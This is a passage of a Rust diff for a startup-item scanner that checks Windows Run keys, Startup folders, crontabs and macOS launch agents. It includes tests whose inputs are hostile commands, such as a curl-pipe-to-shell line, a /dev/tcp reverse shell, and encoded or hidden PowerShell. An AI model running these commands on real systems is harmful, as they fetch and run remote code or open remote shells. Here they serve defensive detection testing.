-        let expanded = expand_env(command, &|var| std::env::var(var).ok());
-        let parsed = parse_command_line(&expanded, &|p| Path::new(p).is_file());
-        let mut c = Candidate {
-            name: clean(name, MAX_TEXT),
-            kind,
-            location,
-            program: (!parsed.program.is_empty()).then(|| clean(&parsed.program, 2 * MAX_TEXT)),
-            arguments: parsed
-                .arguments
-                .iter()
-                .take(MAX_ARGS)
-                .map(|a| clean(a, MAX_TEXT))
-                .collect(),
-            enabled: Some(true),
-            runs_as: runs_as.into(),
-            ..Candidate::default()
-        };
-        if parsed.unquoted_spaces {
-            c.notes.push("Its path has spaces but no quotation marks around it, which Windows can misread and so start a different file.".into());
-        }
-        c
+    const APPROVED: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved";
+
+    /// The items Task Manager knows as on or off, by name.
+    fn approvals(machine: bool, list: &str) -> HashMap<String, bool> {
+        platform::read_registry_values(machine, &format!(r"{APPROVED}\{list}"))
+            .map(|key| {
+                key.values
+                    .into_iter()
+                    .filter_map(|v| Some((v.name.to_lowercase(), startup_approved(&v.data?))))
+                    .collect()
+            })
+            .unwrap_or_default()
     }
 
-    fn scan_key(found: &mut Found, machine: bool, subkey: &str, kind: &'static str) {
+    fn scan_key(
+        found: &mut Found,
+        machine: bool,
+        subkey: &str,
+        kind: &'static str,
+        approved: Option<&str>,
+    ) {
         let hive = if machine { "HKLM" } else { "HKCU" };
         let location = format!(r"{hive}\{subkey}");
-        match platform::read_registry_strings(machine, subkey) {
-            Ok(values) => {
-                let runs_as = if machine { "every user" } else { "you" };
-                for (name, command) in values {
-                    found.push(from_command(
-                        &name,
-                        kind,
-                        location.clone(),
-                        &command,
-                        runs_as,
-                    ));
-                }
-            }
-            Err(why) => found.unreadable(location, why),
+        let key = match platform::read_registry_values(machine, subkey) {
+            Ok(key) => key,
+            Err(why) => return found.unreadable(location, why),
+        };
+        found.truncated |= key.incomplete;
+        let switches = approved
+            .map(|list| approvals(machine, list))
+            .unwrap_or_default();
+        for value in key.values {
+            let mut c = match &value.data {
+                Some(data) if value.is_text() => run_value(
+                    &platform::registry_text(data),
+                    value.expand(),
+                    &|var| std::env::var(var).ok(),
+                    &|p| Path::new(p).is_file(),
+                ),
+                Some(_) => continue, // Windows starts only text values
+                None => Candidate {
+                    notes: vec!["Its value is far larger than any real command, so it was not read and what it starts is not known.".into()],
+                    ..Candidate::default()
+                },
+            };
+            c.enabled = Some(*switches.get(&value.name.to_lowercase()).unwrap_or(&true));
+            c.name = value.name;
+            c.kind = kind;
+            c.location = location.clone();
+            c.runs_as = if machine { "every user" } else { "you" }.into();
+            found.push(c);
         }
     }
 
     fn scan_startup_folder(found: &mut Found, dir: &Path, runs_as: &str) {
+        let switches = approvals(runs_as != "you", "StartupFolder");
         let entries = match fs::read_dir(dir) {
             Ok(entries) => entries,
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
@@ -1142,11 +1952,18 @@ mod registry {
                 return;
             }
         };
-        let mut files: Vec<PathBuf> = entries
-            .flatten()
-            .take(MAX_DIR_ENTRIES)
-            .map(|e| e.path())
-            .collect();
+        let mut files: Vec<PathBuf> = Vec::new();
+        for entry in entries {
+            match entry {
+                Ok(entry) if files.len() < MAX_DIR_ENTRIES && !found.late() => {
+                    files.push(entry.path())
+                }
+                _ => {
+                    found.truncated = true;
+                    break;
+                }
+            }
+        }
         files.sort();
         for path in files {
             let Some(file_name) = path.file_name().map(|n| n.to_string_lossy().to_string()) else {
@@ -1156,28 +1973,25 @@ mod registry {
                 continue;
             }
             let mut c = Candidate {
-                name: clean(
-                    &path
-                        .file_stem()
-                        .map(|s| s.to_string_lossy().to_string())
-                        .unwrap_or_default(),
-                    MAX_TEXT,
-                ),
+                name: path
+                    .file_stem()
+                    .map(|s| s.to_string_lossy().to_string())
+                    .unwrap_or_default(),
                 kind: "startup_folder",
                 location: path.display().to_string(),
-                enabled: Some(true),
+                enabled: Some(*switches.get(&file_name.to_lowercase()).unwrap_or(&true)),
                 runs_as: runs_as.into(),
                 ..Candidate::default()
             };
             if path
                 .extension()
-                .is_some_and(|e| e.eq_ignore_ascii_case("lnk"))
+                .is_some_and(|e| e.eq_ignore_ascii_case("lnk") || e.eq_ignore_ascii_case("url"))
             {
                 c.unresolved = Some("This is a shortcut. The Nex does not read where a shortcut leads yet, so the program it starts was not checked.".into());
-            } else if fs::symlink_metadata(&path).is_ok_and(|m| m.is_file()) {
-                c.program = Some(clean(&path.display().to_string(), 2 * MAX_TEXT));
+            } else if fs::symlink_metadata(&path).is_ok_and(|m| m.is_dir()) {
+                continue; // Windows opens a folder window, it runs nothing in it
             } else {
-                continue;
+                c.program = Some(path.display().to_string());
             }
             found.push(c);
         }
@@ -1187,15 +2001,15 @@ mod registry {
         if let Some(dir) = startup_dir {
             return scan_startup_folder(found, dir, "you");
         }
-        for (machine, subkey, kind) in [
-            (false, RUN, "run_key"),
-            (false, RUN_ONCE, "run_once_key"),
-            (true, RUN, "run_key"),
-            (true, RUN_ONCE, "run_once_key"),
-            (true, RUN_32, "run_key"),
-            (true, RUN_ONCE_32, "run_once_key"),
+        for (machine, subkey, kind, approved) in [
+            (false, RUN, "run_key", Some("Run")),
+            (false, RUN_ONCE, "run_once_key", None),
+            (true, RUN, "run_key", Some("Run")),
+            (true, RUN_ONCE, "run_once_key", None),
+            (true, RUN_32, "run_key", Some("Run32")),
+            (true, RUN_ONCE_32, "run_once_key", None),
         ] {
-            scan_key(found, machine, subkey, kind);
+            scan_key(found, machine, subkey, kind, approved);
         }
         for (var, rest, runs_as) in [
             (
@@ -1213,11 +2027,16 @@ mod registry {
                 scan_startup_folder(found, &Path::new(&base).join(rest), runs_as);
             }
         }
-        found.unreadable(
+        for place in [
             "Services that start automatically",
-            "This version does not check them yet.",
-        );
-        found.unreadable("Scheduled tasks", "This version does not check them yet.");
+            "Scheduled tasks",
+            r"Programs set by policy (Policies\Explorer\Run)",
+            "Sign-in programs (Winlogon Shell and Userinit)",
+            "Active Setup",
+            "Other people's Run keys and Startup folders",
+        ] {
+            found.unreadable(place, "This version does not check them yet.");
+        }
     }
 }
 
@@ -1286,6 +2105,7 @@ mod tests {
             ("/Users/me/Downloads/a", Some("downloads")),
             ("/Users/me/.cache/a", Some("hidden")),
             ("/usr/local/bin/.agent", Some("hidden")),
+            ("./x", None),
             ("/Applications/Foo.app/Contents/MacOS/foo", None),
             ("C:\\Program Files\\Foo\\foo.exe", None),
             ("/bin/ls", None),
@@ -1298,39 +2118,377 @@ mod tests {
     }
 
     #[test]
-    fn interpreters_and_their_scripts_are_found() {
-        assert!(
-            is_interpreter("python3.12") && is_interpreter(&program_stem("C:\\x\\PowerShell.EXE"))
-        );
-        assert!(!is_interpreter("ls"));
-        let sh = script_target("sh", &args(&["-x", "/opt/run.sh", "a"]));
-        assert_eq!(sh, ("sh".into(), Target::Script("/opt/run.sh".into())));
-        assert_eq!(
-            script_target("bash", &args(&["-c", "echo hi"])).1,
-            Target::Inline
-        );
-        let env = script_target("env", &args(&["FOO=1", "python3", "/opt/a.py"]));
-        assert_eq!(env, ("python3".into(), Target::Script("/opt/a.py".into())));
-        let ps = script_target("powershell", &args(&["-NoProfile", "-File", "C:\\a.ps1"]));
-        assert_eq!(ps.1, Target::Script("C:\\a.ps1".into()));
-        assert_eq!(
-            script_target("cmd", &args(&["/c", "a.bat"])).1,
-            Target::Inline
-        );
-        assert_eq!(script_target("sh", &[]).1, Target::Nothing);
+    fn only_understood_interpreter_shapes_name_a_script() {
+        for name in [
+            "python3.12",
+            "bash-5.2",
+            "perl5.34",
+            "osascript",
+            "tclsh8.5",
+        ] {
+            assert!(is_interpreter(name), "{name}");
+        }
+        assert!(is_interpreter(&program_stem("C:\\x\\PowerShell.EXE")) && !is_interpreter("ls"));
+        for (stem, given, want) in [
+            ("sh", &["-x", "/opt/run.sh", "a"][..], Some("/opt/run.sh")),
+            ("bash", &["-eu", "-o", "pipefail", "/opt/a"], Some("/opt/a")),
+            ("bash", &["-o", "/opt/a", "/opt/b"], None),
+            ("bash", &["-c", "/opt/a"], None),
+            ("sh", &["-ec", "/opt/a"], None),
+            ("sh", &["--rcfile", "/opt/a", "/opt/b"], None),
+            ("sh", &["run.sh"], None),
+            ("sh", &["./run.sh"], None),
+            ("sh", &[], None),
+            ("zsh", &["/opt/a"], None),
+            ("zsh", &["-f", "/opt/a"], Some("/opt/a")),
+            ("python3.12", &["-u", "/opt/a.py"], Some("/opt/a.py")),
+            ("python3", &["-m", "/opt/a"], None),
+            ("python3", &["-c", "x"], None),
+            ("perl", &["-e", "/opt/a"], None),
+            ("perl", &["-Mx", "/opt/a"], None),
+            ("ruby", &["-r", "/opt/a", "/opt/b"], None),
+            (
+                "osascript",
+                &["-l", "JavaScript", "/opt/a.js"],
+                Some("/opt/a.js"),
+            ),
+            ("osascript", &["-e", "/opt/a"], None),
+            ("env", &["sh", "/opt/a"], None),
+            (
+                "powershell",
+                &[
+                    "-NoProfile",
+                    "-ExecutionPolicy",
+                    "Bypass",
+                    "-File",
+                    r"C:\a.ps1",
+                ],
+                Some(r"C:\a.ps1"),
+            ),
+            (
+                "powershell",
+                &["-ExecutionPolicy", "Bypass", "-File", r"C:\a.ps1"],
+                None,
+            ),
+            ("powershell", &["-NoProfile", r"C:\a.ps1"], None),
+            (
+                "powershell",
+                &["-NoProfile", "-File", r"\\host\a.ps1"],
+                None,
+            ),
+            ("powershell", &["-enc", "AAAA"], None),
+            ("wscript", &["//nologo", r"C:\a.vbs"], Some(r"C:\a.vbs")),
+            ("wscript", &["//E:jscript", r"C:\a.txt"], None),
+            ("cmd", &["/c", r"C:\a.bat"], None),
+        ] {
+            assert_eq!(script_of(stem, &args(given)), want, "{stem} {given:?}");
+        }
     }
 
     #[test]
-    fn crontab_lines_become_jobs() {
-        let text = "# comment\nMAILTO=me\nPATH=/usr/bin\n\n*/5 * * * * /opt/a.sh --x\n@reboot /opt/b\n1 2 3 4\n";
-        let jobs = parse_crontab(text);
+    fn crontab_lines_become_jobs_and_settings() {
+        let text = "# comment\nMAILTO=me\nSHELL = /tmp/x a b c d e\n\n*/5 * * * * /opt/a.sh  --x\n@reboot /opt/b\n1 2 3 4\n0 1 * * * A=1 /opt/c\n";
+        let tab = parse_crontab(text);
+        let pairs = |list: &[(&str, &str)]| -> Vec<(String, String)> {
+            list.iter()
+                .map(|(a, b)| (a.to_string(), b.to_string()))
+                .collect()
+        };
         assert_eq!(
-            jobs,
-            [
-                ("*/5 * * * *".to_string(), "/opt/a.sh --x".to_string()),
-                ("@reboot".to_string(), "/opt/b".to_string())
-            ]
+            tab.settings,
+            pairs(&[("MAILTO", "me"), ("SHELL", "/tmp/x a b c d e")])
         );
+        assert_eq!(
+            tab.jobs,
+            pairs(&[
+                ("*/5 * * * *", "/opt/a.sh  --x"),
+                ("@reboot", "/opt/b"),
+                ("0 1 * * *", "A=1 /opt/c")
+            ])
+        );
+        assert!(is_plain_command("/opt/a.sh --x=1 b"));
+        for shell in [
+            "/opt/a; /opt/b",
+            "/opt/a | sh",
+            "/opt/a $X",
+            "/opt/a `b`",
+            "/opt/*",
+            "A=1 /opt/a",
+            "/opt/a=1 b",
+            "opt/a",
+            "~/a",
+            "/opt/a 'b'",
+            "/opt/a > /b",
+            "/opt/a%b",
+            "(/opt/a)",
+        ] {
+            assert!(!is_plain_command(shell), "{shell}");
+        }
+    }
+
+    #[test]
+    fn plist_xml_is_read_whatever_else_is_in_it() {
+        let deep = format!("{}{}", "<array>".repeat(300), "</array>".repeat(300));
+        let xml = format!(
+            "<?xml version=\"1.0\"?>\n<!DOCTYPE plist PUBLIC \"-//A//B\" \"http://x\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>a &amp;lt; &lt;b&gt;</string><key>d</key><date>2020-01-01T00:00:00Z</date><key>b</key><data>\nAAAA\n</data><key>n</key><real>nan</real><key>x</key>{deep}<key>in</key><dict><key>Program</key><string>/no</string><key>Y</key><dict><key>Z</key><true/></dict></dict><key>Program</key><string>/opt/a\nb</string><key>ProgramArguments</key><array><string/><string>x</string><integer>1</integer><dict><key>q</key><string>s</string></dict><array/></array><key>E</key><dict/><key>On</key><true/><key>Off</key><false/></dict>\n</plist>\n"
+        );
+        let settings = read_plist_xml(&xml).unwrap();
+        let get = |key: &str| {
+            settings
+                .iter()
+                .find(|(k, _)| k == key)
+                .map(|(_, v)| v.clone())
+        };
+        assert_eq!(get("Label"), Some(Setting::Text("a &lt; <b>".into())));
+        assert_eq!(get("Program"), Some(Setting::Text("/opt/a\nb".into())));
+        assert_eq!(
+            get("ProgramArguments"),
+            Some(Setting::List(vec![
+                Some(String::new()),
+                Some("x".into()),
+                None,
+                None,
+                None
+            ]))
+        );
+        assert_eq!(
+            get("in"),
+            Some(Setting::Keys(vec!["Program".into(), "Y".into()]))
+        );
+        assert_eq!(get("n"), Some(Setting::Other));
+        assert_eq!(get("E"), Some(Setting::Keys(vec![])));
+        assert_eq!(
+            (get("On"), get("Off")),
+            (Some(Setting::Flag(true)), Some(Setting::Flag(false)))
+        );
+        assert_eq!(
+            read_plist_xml("<plist version=\"1.0\"><dict/></plist>"),
+            Some(vec![])
+        );
+        for bad in [
+            "",
+            "<plist><array></array></plist>",
+            "<plist><dict><key>a</key>",
+            "<string>x</string>",
+            "</dict>",
+        ] {
+            assert_eq!(read_plist_xml(bad), None, "{bad}");
+        }
+    }
+
+    #[test]
+    fn variables_that_load_other_code_are_known() {
+        for name in [
+            "BASH_ENV",
+            "ENV",
+            "DYLD_INSERT_LIBRARIES",
+            "PYTHONSTARTUP",
+            "PERL5LIB",
+            "PERL5OPT",
+            "RUBYOPT",
+            "NODE_OPTIONS",
+            "ZDOTDIR",
+            "BASH_FUNC_ls%%",
+        ] {
+            assert!(loads_other_code(name), "{name}");
+        }
+        for name in ["PATH", "HOME", "LANG", "ENVIRONMENT"] {
+            assert!(!loads_other_code(name), "{name}");
+        }
+    }
+
+    #[test]
+    fn windows_paths_that_would_contact_another_computer_are_never_looked_up() {
+        for path in [
+            r"\\host\share\a.exe",
+            "//host/share/a.exe",
+            r"\\?\C:\a.exe",
+            r"\\.\pipe\a",
+            r"\??\C:\a.exe",
+            r"\a.exe",
+            "a.exe",
+            "powershell",
+            r"C:a.exe",
+            "",
+            "C:",
+        ] {
+            assert!(!full_path(path, true), "{path}");
+            assert_eq!(
+                parse_command_line(&format!("{path} -x"), &|p| panic!("looked up {p}")).arguments,
+                if path.is_empty() {
+                    args(&[])
+                } else {
+                    args(&["-x"])
+                },
+                "{path}"
+            );
+        }
+        assert!(full_path(r"C:\a.exe", true) && full_path("d:/a", true));
+        assert!(full_path("/a", false) && !full_path("./a", false) && !full_path("a", false));
+        assert_eq!(path_in("--file=/opt/a", false), Some("/opt/a"));
+        assert_eq!(path_in(r"C:\a.dll,Entry", true), Some(r"C:\a.dll"));
+        assert_eq!(path_in(r"/i:D:\x.dll", true), Some(r"D:\x.dll"));
+        assert_eq!(path_in(r"\\host\a.dll", true), None);
+    }
+
+    #[test]
+    fn windows_adds_exe_to_a_path_without_an_extension() {
+        let on = |files: &'static [&'static str]| move |p: &str| files.contains(&p);
+        let hijack = parse_command_line(
+            r"C:\Program Files\A\a.exe -x",
+            &on(&[r"C:\Program.exe", r"C:\Program Files\A\a.exe"]),
+        );
+        assert_eq!(
+            (hijack.program.as_str(), hijack.unquoted_spaces),
+            (r"C:\Program.exe", true)
+        );
+        let plain = parse_command_line(r"C:\T\a -x", &on(&[r"C:\T\a.exe"]));
+        assert_eq!(
+            (plain.program.as_str(), plain.arguments),
+            (r"C:\T\a.exe", args(&["-x"]))
+        );
+        assert_eq!(
+            parse_command_line("\"C:\\T\\a\" -x", &on(&[r"C:\T\a.exe"])).program,
+            r"C:\T\a.exe"
+        );
+        // Every argument is kept, however many there are.
+        let many = format!("\"C:\\T\\a.exe\" {}", "x ".repeat(500));
+        assert_eq!(parse_command_line(&many, &|_| true).arguments.len(), 500);
+    }
+
+    #[test]
+    fn run_values_expand_only_when_windows_would() {
+        let lookup = |name: &str| (name == "TEMP").then(|| r"C:\T".to_string());
+        let program = |expand| {
+            run_value(r"%TEMP%\a.exe -x", expand, &lookup, &|_| true)
+                .program
+                .unwrap()
+        };
+        assert_eq!(program(true), r"C:\T\a.exe");
+        assert_eq!(program(false), r"%TEMP%\a.exe");
+        assert!(startup_approved(&[2, 0, 0]) && startup_approved(&[6]) && startup_approved(&[]));
+        assert!(!startup_approved(&[3, 0, 0]) && !startup_approved(&[7]));
+    }
+
+    #[test]
+    fn a_borrowed_vendor_name_is_judged_by_what_can_be_told() {
+        use Claim::{Confirmed, Contradicted, Unknown};
+        // (vendor, part of the system, signed by the vendor, trusted)
+        for (vendor, os_file, signed, trusted, want) in [
+            ("Apple", true, Some(true), true, Confirmed),
+            ("Apple", false, Some(true), true, Confirmed),
+            ("Apple", false, Some(false), true, Contradicted),
+            ("Microsoft", false, Some(true), true, Confirmed),
+            ("Microsoft", false, Some(false), true, Contradicted),
+            ("Microsoft", true, Some(false), true, Contradicted),
+            // Windows: whose signature it is cannot be told.
+            ("Microsoft", true, None, true, Confirmed),
+            ("Microsoft", false, None, true, Unknown),
+            ("Apple", false, None, true, Unknown),
+            ("Apple", true, None, true, Unknown),
+            ("Microsoft", false, None, false, Contradicted),
+            ("Apple", false, None, false, Contradicted),
+        ] {
+            assert_eq!(
+                check_claim(vendor, os_file, signed, trusted),
+                want,
+                "{vendor} {os_file} {signed:?} {trusted}"
+            );
+        }
+    }
+
+    #[test]
+    fn commands_that_hide_things_are_found_by_windows_names_too() {
+        let check = |program: &str, given: &[&str]| {
+            let cfg = AppConfig::for_base_dir(Path::new("/nonexistent/thenex"));
+            judge(
+                &cfg,
+                &BinaryAiScanner::heuristic_only(),
+                Candidate {
+                    program: Some(program.into()),
+                    arguments: args(given),
+                    ..Candidate::default()
+                },
+            )
+        };
+        for (program, given) in [
+            ("powershell", &["-enc", "AAAA"][..]),
+            (r"\\host\powershell.exe", &["-enc", "AAAA"]),
+            ("PowerShell.EXE", &["-w", "hidden", "-c", "x"]),
+            ("certutil", &["-urlcache", "x"]),
+        ] {
+            let item = check(program, given);
+            assert_eq!(
+                item.verdict,
+                Verdict::Suspicious,
+                "{program}: {:?}",
+                item.reasons
+            );
+        }
+        // Not found, but what it would run is said all the same.
+        for program in [
+            "rundll32.exe",
+            "regsvr32",
+            "msbuild",
+            "mshta.exe",
+            "wscript",
+            "cmd",
+            "rundll32",
+        ] {
+            let item = check(program, &["x"]);
+            assert_eq!(
+                (item.verdict, item.exists),
+                (Verdict::WorthALook, None),
+                "{program}"
+            );
+        }
+        let bare = check("updater", &["--quiet"]);
+        assert_eq!((bare.verdict, bare.exists), (Verdict::NotChecked, None));
+    }
+
+    #[test]
+    fn the_largest_possible_report_still_reaches_the_app() {
+        let long = "\"".repeat(5000);
+        let item = StartupItem {
+            name: long.clone(),
+            kind: long.clone(),
+            location: long.clone(),
+            program: Some(long.clone()),
+            arguments: vec![long.clone(); 100],
+            script: Some(long.clone()),
+            enabled: Some(false),
+            exists: Some(false),
+            trusted: false,
+            verdict: Verdict::WorthALook,
+            score: Some(0.123_456_79),
+            reasons: vec![long.clone(); 30],
+            allowed: false,
+            runs_as: long.clone(),
+        };
+        let place = Unreadable {
+            place: long.clone(),
+            reason: long,
+        };
+        let mut report = StartupReport {
+            items: vec![item; MAX_ITEMS + 1],
+            unreadable: vec![place; MAX_UNREADABLE + 1],
+            truncated: false,
+        };
+        report.clamp();
+        assert!(report.truncated);
+        assert_eq!(report.items[0].arguments.last().unwrap(), "… and 85 more");
+        let once = report.clone();
+        report.clamp();
+        assert_eq!(report, once, "the app clamps again and must not change it");
+        let bytes = serde_json::to_vec(&report).unwrap().len() as u64;
+        assert!(bytes < MAX_REPORT_BYTES, "{bytes}");
+        // Other places that could not be read are counted, not dropped in silence.
+        let mut few = StartupReport {
+            unreadable: vec![report.unreadable[0].clone(); MAX_UNREADABLE + 1],
+            ..StartupReport::default()
+        };
+        few.clamp();
+        assert!(few.truncated);
     }
 
     #[test]
@@ -1343,7 +2501,7 @@ mod tests {
             arguments: vec!["a".repeat(1000); 40],
             script: None,
             enabled: Some(true),
-            exists: true,
+            exists: Some(true),
             trusted: false,
             verdict: Verdict::WorthALook,
             score: None,
@@ -1399,7 +2557,7 @@ mod tests {
             .keys()
             .cloned()
             .collect();
-        assert_eq!(top.len(), 4);
+        assert_eq!(top.len(), 3);
     }
 
     #[test]
@@ -1566,7 +2724,7 @@ mod tests {
                 arguments: vec![],
                 script: None,
                 enabled: None,
-                exists: false,
+                exists: None,
                 trusted: false,
                 verdict: Verdict::NotChecked,
                 score: None,
@@ -1717,7 +2875,7 @@ mod tests {
             let good = item(&report, "com.example.good");
             assert_eq!(
                 (good.verdict, good.trusted, good.exists, good.enabled),
-                (Verdict::NothingFound, true, true, Some(true))
+                (Verdict::NothingFound, true, Some(true), Some(true))
             );
             assert_eq!(
                 (
@@ -1732,34 +2890,25 @@ mod tests {
             let missing = item(&report, "com.example.missing");
             assert_eq!(
                 (missing.verdict, missing.exists),
-                (Verdict::WorthALook, false)
+                (Verdict::WorthALook, Some(false))
             );
             assert!(missing.reasons[0].contains("not there"));
-            assert_eq!(
-                report.items.len(),
-                4,
-                "good, binary, the followed link and missing: {report:?}"
-            );
-            let bad: Vec<String> = report
-                .unreadable
-                .iter()
-                .map(|u| u.place.rsplit('/').next().unwrap().to_string())
-                .collect();
-            for name in [
-                "broken.plist",
-                "garbage.plist",
-                "huge.plist",
-                "linkpipe.plist",
-                "pipe.plist",
-                "folder.plist",
-            ] {
-                assert!(
-                    bad.contains(&name.to_string()),
-                    "{name} should be unreadable: {bad:?}"
+            // What could not be read is an item too, never left out.
+            for name in ["broken", "garbage", "huge", "linkpipe", "pipe", "folder"] {
+                let bad = item(&report, name);
+                assert_eq!(
+                    bad.verdict,
+                    Verdict::WorthALook,
+                    "{name}: {:?}",
+                    bad.reasons
                 );
             }
-            assert!(!bad.contains(&"ignored.txt".to_string()));
-            assert_eq!(report.unreadable.len(), 6);
+            assert_eq!(
+                report.items.len(),
+                10,
+                "those, good, binary, the followed link and missing: {report:?}"
+            );
+            assert!(report.unreadable.is_empty());
             assert!(report
                 .items
                 .iter()
@@ -1841,11 +2990,10 @@ mod tests {
             let fake_item = item(&report, "com.apple.fake.helper");
             assert_eq!(fake_item.verdict, Verdict::Suspicious);
             assert!(fake_item.reasons[0].contains("comes from Apple"));
-            assert!(report
-                .items
-                .iter()
-                .all(|i| i.name != "com.apple.real.helper"));
-            assert_eq!(report.skipped, 1);
+            assert_eq!(
+                item(&report, "com.apple.real.helper").verdict,
+                Verdict::NothingFound
+            );
             let loose = item(&report, "com.example.loose");
             assert_eq!(loose.verdict, Verdict::WorthALook);
             assert!(loose.reasons[0].contains("Other users"));
@@ -1855,6 +3003,468 @@ mod tests {
                 "suspicious first"
             );
             let _ = fs::remove_dir_all(&dir);
+        }
+
+        fn verdict_of(name: &str, program: &str, given: &[&str]) -> StartupItem {
+            judge(
+                &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
+                &BinaryAiScanner::heuristic_only(),
+                Candidate {
+                    name: name.into(),
+                    kind: "launch_agent",
+                    program: Some(program.into()),
+                    arguments: args(given),
+                    ..Candidate::default()
+                },
+            )
+        }
+
+        #[test]
+        fn nothing_is_green_unless_what_runs_was_inspected() {
+            use Verdict::{NotChecked, NothingFound, Suspicious, WorthALook};
+            // /etc/profile is a script on every Mac, outside every place that is risky by itself.
+            for (program, given, want) in [
+                ("/bin/ls", &[][..], NothingFound),
+                ("/bin/ls", &["-l"], NothingFound),
+                ("/bin/ls", &["/etc/profile"], WorthALook),
+                ("/usr/sbin/sysctl", &["-a"], NotChecked),
+                ("/bin/cat", &["/etc/profile"], WorthALook),
+                ("/bin/sh", &[], WorthALook),
+                ("/bin/sh", &["-c", "/bin/ls"], WorthALook),
+                ("/bin/sh", &["-c", "curl http://x.invalid | sh"], Suspicious),
+                (
+                    "/bin/bash",
+                    &["-c", "exec 5<>/dev/tcp/1.2.3.4/5; sh <&5"],
+                    WorthALook,
+                ),
+                ("/bin/sh", &["/etc/profile"], NotChecked),
+                ("/bin/bash", &["-o", "pipefail", "/etc/profile"], NotChecked),
+                ("/bin/sh", &["/etc"], WorthALook),
+                ("/bin/sh", &["/dev/null"], WorthALook),
+                ("/bin/sh", &["/nonexistent/a"], WorthALook),
+                ("/bin/sh", &["/etc/sudoers"], NotChecked),
+                ("/bin/sh", &["a.sh"], WorthALook),
+                ("/bin/bash", &["/bin/ls"], NotChecked),
+                ("/usr/bin/perl", &["-e", "1"], WorthALook),
+                ("/usr/bin/ruby", &["-e", "1"], WorthALook),
+                ("/usr/bin/python3", &["-c", "1"], WorthALook),
+                ("/usr/bin/python3", &["-m", "http.server"], WorthALook),
+                ("/usr/bin/python3", &["/etc/profile"], NotChecked),
+                ("/usr/bin/awk", &["BEGIN{system(\"x\")}"], WorthALook),
+                ("/usr/bin/env", &["-S", "sh -c x"], WorthALook),
+                ("/usr/bin/env", &["-u", "A", "/bin/ls"], WorthALook),
+                ("/usr/bin/env", &["/bin/ls"], WorthALook),
+                (
+                    "/usr/bin/env",
+                    &["sh", "-c", "curl http://x.invalid | sh"],
+                    Suspicious,
+                ),
+                ("/usr/bin/nohup", &["/bin/ls"], WorthALook),
+                ("/usr/bin/nice", &["/bin/ls"], WorthALook),
+                ("/usr/bin/open", &["-a", "X"], WorthALook),
+                (
+                    "/usr/bin/osascript",
+                    &["-l", "JavaScript", "/etc/profile"],
+                    NotChecked,
+                ),
+                ("/usr/bin/osascript", &["-e", "beep"], WorthALook),
+                ("/usr/bin/make", &[], WorthALook),
+                ("/etc/profile", &[], NotChecked),
+                ("ls", &[], NotChecked),
+                ("./ls", &[], NotChecked),
+                // Reported by the live guard, never stopped: no more than worth a look here.
+                (
+                    "/usr/bin/osascript",
+                    &["-e", "do shell script \"cp /tmp/a /b\""],
+                    WorthALook,
+                ),
+            ] {
+                let item = verdict_of("com.example.x", program, given);
+                assert_eq!(
+                    item.verdict, want,
+                    "{program} {given:?}: {:?}",
+                    item.reasons
+                );
+                // An Apple label is no shield: it never makes a verdict better.
+                let item = verdict_of("com.apple.x", program, given);
+                assert!(
+                    item.verdict.rank() <= want.rank(),
+                    "com.apple.x {program} {given:?}"
+                );
+            }
+        }
+
+        #[test]
+        fn links_copies_and_odd_spellings_are_judged_as_what_they_are() {
+            let dir = scratch("spelling");
+            let real = fs::canonicalize(&dir).unwrap();
+            let link = dir.join("helper");
+            symlink("/bin/sh", &link).unwrap();
+            let item = verdict_of("com.apple.x", link.to_str().unwrap(), &["-c", "x"]);
+            assert!(
+                item.reasons.iter().any(|r| r.contains("It starts sh")),
+                "{:?}",
+                item.reasons
+            );
+            assert!(item
+                .reasons
+                .iter()
+                .any(|r| r.contains("leads to another file")));
+            let copy = dir.join("updater");
+            fs::copy("/bin/sh", &copy).unwrap();
+            let item = verdict_of(
+                "com.example.x",
+                copy.to_str().unwrap(),
+                &["-c", "curl http://x.invalid|sh"],
+            );
+            assert_eq!(item.verdict, Verdict::Suspicious, "{:?}", item.reasons);
+            assert!(item
+                .reasons
+                .iter()
+                .any(|r| r.contains("copy of a system tool")));
+            // Spellings that once looked like the sealed system.
+            let script = real.join("evil");
+            fs::write(&script, "#!/bin/sh\n").unwrap();
+            for prefix in [
+                "/System//Volumes/Data",
+                "/System/volumes/data",
+                "/System/./Volumes/Data",
+                "/usr/bin/../..",
+            ] {
+                let text = format!("{prefix}{}", script.display());
+                let item = verdict_of("com.apple.x", &text, &[]);
+                assert_eq!(
+                    (item.trusted, item.verdict),
+                    (false, Verdict::Suspicious),
+                    "{text}: {:?}",
+                    item.reasons
+                );
+            }
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn the_exact_file_is_judged_however_long_or_odd_its_name() {
+            let dir = scratch("exact");
+            let launch = dir.join("launch");
+            // A cut or cleaned name would name these instead.
+            fs::write(dir.join("a b"), "x").unwrap();
+            let deep = dir
+                .join("d".repeat(200))
+                .join("e".repeat(200))
+                .join("f".repeat(200));
+            fs::create_dir_all(&deep).unwrap();
+            let long = deep.join("run");
+            fs::write(&long, "x").unwrap();
+            let newline = dir.join("a\nb");
+            fs::write(
+                launch.join("a.plist"),
+                plist("newline", newline.to_str().unwrap(), &[], ""),
+            )
+            .unwrap();
+            fs::write(
+                launch.join("b.plist"),
+                plist("long", long.to_str().unwrap(), &[], ""),
+            )
+            .unwrap();
+            let mut many = vec!["-x"; 100];
+            let script = format!("{}/{}", dir.display(), "s".repeat(250));
+            fs::write(&script, "x").unwrap();
+            many.push(&script);
+            fs::write(launch.join("c.plist"), plist("many", "/bin/sh", &many, "")).unwrap();
+            let report = run_in(&dir, Limits::default());
+            assert_eq!(item(&report, "newline").exists, Some(false));
+            assert_eq!(item(&report, "long").exists, Some(true));
+            let many = item(&report, "many");
+            assert!(many.script.is_some(), "{many:?}");
+            assert!(
+                !many.reasons.iter().any(|r| r.contains("not there")),
+                "{many:?}"
+            );
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn no_setting_can_make_a_definition_disappear() {
+            let dir = scratch("hide");
+            let launch = dir.join("launch");
+            let deep = |n| {
+                format!(
+                    "<key>k</key>{}{}",
+                    "<array>".repeat(n),
+                    "</array>".repeat(n)
+                )
+            };
+            for (name, extra) in [
+                (
+                    "date",
+                    "<key>k</key><date>2020-01-01T00:00:00Z</date>".to_string(),
+                ),
+                ("data", "<key>k</key><data>AAAA</data>".into()),
+                ("nan", "<key>k</key><real>nan</real>".into()),
+                ("deep", deep(300)),
+                ("deeper", deep(3000)),
